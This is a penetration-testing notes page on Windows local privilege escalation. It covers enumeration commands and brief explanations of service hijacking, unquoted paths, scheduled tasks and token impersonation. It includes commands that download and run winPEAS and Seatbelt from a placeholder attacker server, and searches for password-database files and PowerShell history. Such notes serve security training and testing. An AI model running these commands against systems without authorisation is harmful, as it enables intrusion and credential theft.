# Local Privilege Escalation

## Basic Enumeration

Username and hostname:

```batch
whoami
hostname
```

Group memberships of the current user:

```batch
whoami /groups
```

Existing users and groups:

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <group_name>
```
{% endtab %}

{% tab title="Batch" %}
```batch
net user
```
{% endtab %}
{% endtabs %}

Operating system, version and architecture:

```batch
systeminfo
```

Network information:

```batch
ipconfig /all
route print
netstat -ano
```

Installed applications:

{% code overflow="wrap" %}
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
{% endcode %}

Running processes:

```powershell
Get-Process
Get-Process <Proccess> | select Path
```

Search for files:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.bin *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
```
{% endcode %}

PowerShell history:

```
Get-History
(Get-PSReadlineOption).HistorySavePath
```

PowerShell history event logs:

```
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | ForEach-Object { $_.Message } | findstr "dave*"
```

## Automated Enumeration

Download and execute **`winPEAS`** and **`Seatbelt`**:

```powershell
iwr -uri http://<attacker_http_server>/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://<attacker_http_server>/Seatbelt.exe -Outfile Seatbelt.exe
.\Seatbelt.exe -group=all
```

## Windows Services Exploitations

### Service Binary Hijacking

This attack involves replacing the service binary with a malicious version and restart the service.

{% content-ref url="service-binary-hijacking.md" %}
[service-binary-hijacking.md](service-binary-hijacking.md)
{% endcontent-ref %}

### Service DLL Hijacking

This attack is similar to the "Service Binary Hijacking" but Instead of replacing the binary, it involves overwriting a [DLL ](https://en.wikipedia.org/wiki/Dynamic-link\_library)the binary uses.

Another method is to hijack the DLL search order.

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

{% content-ref url="service-dll-hijacking.md" %}
[service-dll-hijacking.md](service-dll-hijacking.md)
{% endcontent-ref %}

### Unquoted Service Paths

This attack relies on windows find an executable path when it's Unquoted.

{% content-ref url="unquoted-service-paths.md" %}
[unquoted-service-paths.md](unquoted-service-paths.md)
{% endcontent-ref %}

## Scheduled Tasks

Windows Task Scheduler can execute automated tasks. This tasks can execute binary files and also scripts. Also, The scheduled tasks is running behalf on user.

{% content-ref url="scheduled-tasks.md" %}
[scheduled-tasks.md](scheduled-tasks.md)
{% endcontent-ref %}

## Token impersonation

Windows identifies users by generating an access token assigned to each user. This token contains information about the user's privileges. When a user runs a process or thread, the primary token is assigned, specifying the permissions for that process. A thread can also have an impersonation token assigned, which provides a different security context; in this case, the process will run based on the impersonation token instead of the primary token.

{% content-ref url="token-impersonation.md" %}
[token-impersonation.md](token-impersonation.md)
{% endcontent-ref %}

## References

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" %}
Hacktricks - Windows Local Privilege Escalation
{% endembed %}

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" %}
winPEAS
{% endembed %}
